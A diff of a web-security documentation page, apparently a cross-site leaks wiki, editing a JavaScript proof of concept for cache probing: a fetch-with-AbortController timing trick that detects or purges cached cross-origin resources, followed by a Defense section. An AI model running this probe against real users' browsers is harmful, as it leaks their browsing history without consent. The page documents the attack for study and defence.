@@ -56,31 +56,52 @@ Often some of these methods might be considered a bug in the browser (e.g. [this
 ## Fetch with AbortController
 The AbortController can be used with fetch and setTimeout to detect if content has been cached without caching new content in the process.
 ```javascript
-// Example usage: ifCached("https://www.google.com/favicon.ico").then(console.info);
 async function ifCached(url, purge = false) {
-    var state = true;
     var controller = new AbortController();
     var signal = controller.signal;
-    var timeout = await setTimeout(_ => { // Stop request after max
+    // After 9ms, abort the request. If the timeout was successful, 
+    // the request must have been retrieved from the browser cache.
+    // The timeout might need to be adjusted for the attack to work.
+    var timeout = await setTimeout(() => { 
         controller.abort();
-        state = false;
-    // This number may need changing for different browsers
     }, 9);
     try {
-        // credentials is currently only needed for firefox
-        let options = {mode: "no-cors", credentials: "include", signal};
-        // purge item from cache if wanted
+        // credentials option is needed for Firefox
+        let options = {
+            mode: "no-cors", 
+            credentials: "include", 
+            signal: signal
+        };
+        // if the option "cache: reload" is set, the browser will purge 
+        // the resource from the browser cache
         if(purge) options.cache = "reload";
+        
         await fetch(url, options);
     } catch (err) {
-        // Website blocked by client
+        // When controller.abort() is called, the fetch will throw an Exception
+        if(purge) console.log("The resource was purged from the cache");
+        else console.log("The resource is not cached");
         return false
     }
+    // clearTimeout will only be called if this line was reached in less than 9ms,
+    // which means that the resource must have arrived from the cache
     clearTimeout(timeout);
-    return state;
+    console.log("The resource is cached");
+    
+    return true;
 }
-```
 
+// purge https://example.org from the cache
+await ifCached('https://example.org', true);
+
+// Put https://example.org into the cache
+// Skip this step to simulate a case where example.org is not cached
+open('https://example.org');
+
+// TODO: wait 1 second (until example.org loads)
+
+// Check if https://example.org is in the cache
+await ifCached('https://example.org');
 ## Defense
 
 Currently there are no good defense mechanisms that would allow websites to fully protect against Cache Probing attacks. Nonetheless, a website might mitigate the attack surface by deploying [Cache Protections]({{< ref "cache-protections.md" >}}), such as:
